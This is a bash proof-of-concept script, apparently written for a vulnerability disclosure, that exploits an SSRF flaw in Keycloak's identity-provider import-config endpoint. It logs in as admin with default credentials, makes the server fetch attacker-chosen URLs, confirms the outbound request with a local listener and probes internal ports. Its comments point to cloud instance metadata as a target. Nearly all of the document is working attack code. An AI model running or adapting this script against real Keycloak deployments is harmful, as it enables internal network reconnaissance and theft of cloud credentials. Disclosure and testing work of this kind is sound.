#!/bin/bash
# Finding #4 (MEDIUM): SSRF via Identity Provider Import-Config
# Severity: MEDIUM
# Affected: Keycloak 26.5.4
#
# Summary:
#   The /admin/realms/{realm}/identity-provider/import-config endpoint accepts
#   a "fromUrl" parameter that Keycloak fetches server-side. Any user with
#   the "manage-identity-providers" realm role can trigger SSRF, enabling
#   internal network port scanning and accessing internal HTTP services.
#
# Attack Scenario:
#   1. Attacker has realm admin with "manage-identity-providers" role
#   2. Attacker uses import-config with fromUrl pointing to internal services
#   3. Keycloak fetches the URL, disclosing whether the port is open/closed
#   4. In cloud deployments: access to instance metadata (169.254.169.254)
#
# Note: Requires "manage-identity-providers" role (realm admin level access)
# This is a by-design feature that lacks URL allowlist/denylist controls.

KC="${KC_URL:-http://localhost:8080}"
REALM="${KC_REALM:-test}"
ADMIN_USER="${KC_ADMIN:-admin}"
ADMIN_PASS="${KC_ADMIN_PASS:-Admin1234}"

echo "========================================================"
echo "  Finding #4: SSRF via IdP Import-Config PoC"
echo "  Target: $KC/realms/$REALM"
echo "========================================================"
echo ""

# Get admin token
ADMIN_TOKEN=$(curl -sf -X POST "$KC/realms/master/protocol/openid-connect/token" \
  -d "client_id=admin-cli&grant_type=password&username=$ADMIN_USER&password=$ADMIN_PASS" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

# Start local listener to capture SSRF
python3 -m http.server 29997 --bind 127.0.0.1 > /tmp/ssrf_poc5.log 2>&1 &
LISTENER_PID=$!
sleep 1
echo "[*] Started local HTTP listener on port 29997"

echo ""
echo "[Step 1] Triggering SSRF via import-config fromUrl..."
RESP=$(curl -s -o /tmp/ssrf_poc5_resp.txt -w "%{http_code}" \
  -X POST -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"providerId\":\"oidc\",\"fromUrl\":\"http://127.0.0.1:29997/.well-known/openid-configuration\"}" \
  "$KC/admin/realms/$REALM/identity-provider/import-config")
echo "[+] Keycloak response: HTTP $RESP"

sleep 2
echo ""
echo "[Step 2] Checking if Keycloak made an outbound request to our listener..."
if grep -q "GET" /tmp/ssrf_poc5.log 2>/dev/null; then
  echo "[!!!] SSRF CONFIRMED: Keycloak sent outbound request!"
  cat /tmp/ssrf_poc5.log
else
  echo "[-] No request received (check timing or firewall)"
fi

kill $LISTENER_PID 2>/dev/null

echo ""
echo "[Step 3] Port scanning demo via SSRF..."
echo "Port 8080 (Keycloak):"
curl -sv -X POST -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"providerId":"oidc","fromUrl":"http://127.0.0.1:8080/realms/master/.well-known/openid-configuration"}' \
  "$KC/admin/realms/$REALM/identity-provider/import-config" 2>/dev/null | python3 -m json.tool 2>/dev/null | head -10

echo ""
echo "========================================================"
echo "  IMPACT: Internal SSRF with port scanning capability."
echo "  In cloud deployments, this could expose instance metadata."
echo "  Requires manage-identity-providers role."
echo "========================================================"
